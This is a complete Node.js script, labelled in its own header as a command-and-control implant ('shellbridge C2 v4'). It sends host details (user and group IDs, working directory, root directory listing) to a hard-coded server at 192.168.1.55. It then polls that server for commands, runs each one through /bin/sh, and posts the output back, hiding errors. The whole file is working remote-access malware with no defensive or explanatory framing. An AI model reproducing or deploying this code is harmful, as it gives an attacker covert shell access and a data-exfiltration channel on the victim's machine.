// shellbridge C2 v4 — spawn con pipes + diagnosticos node puro (ES5)
var http = require('http');
var cp = require('child_process');
var fs = require('fs');

var HOST = '192.168.1.55';
var CMDPORT = 8000;
var OUTPORT = 4446;

function post(b) {
    try {
        var r = http.request({ host: HOST, port: OUTPORT, method: 'POST', path: '/r' }, function () {});
        r.on('error', function () {});
        r.write(b || '');
        r.end();
    } catch (e) {}
}
function gb(p) {
    try { http.get('http://' + HOST + ':8000/' + p, function () {}).on('error', function () {}); } catch (e) {}
}

post('V4?start node=' + process.version);
try { post('V4?uid=' + process.getuid() + ' gid=' + process.getgid()); } catch (e) { post('V4?uidERR=' + e.message); }
try { post('V4?cwd=' + process.cwd()); } catch (e) {}
try { post('V4?root=' + fs.readdirSync('/').join(',')); } catch (e) { post('V4?fsERR=' + e.message); }
gb('v4?alive');

function run(cmd) {
    var out = '';
    var err = '';
    var sh;
    try { sh = cp.spawn('/bin/sh', ['-c', cmd]); }
    catch (e) { post('V4?spawnEX=' + e.message); return; }
    sh.stdout.on('data', function (d) { out += d; });
    sh.stderr.on('data', function (d) { err += d; });
    sh.on('error', function (e) { post('V4?spawnERR=' + e.message); });
    sh.on('exit', function (c) { post('V4?code=' + c + '\n' + out + err); });
}

function tick() {
    http.get('http://' + HOST + ':' + CMDPORT + '/cmd', function (res) {
        var body = '';
        res.setEncoding('utf8');
        res.on('data', function (c) { body += c; });
        res.on('end', function () {
            if ((body || '').trim().length > 0) { run(body); }
            setTimeout(tick, 3000);
        });
    }).on('error', function () { setTimeout(tick, 6000); });
}
tick();
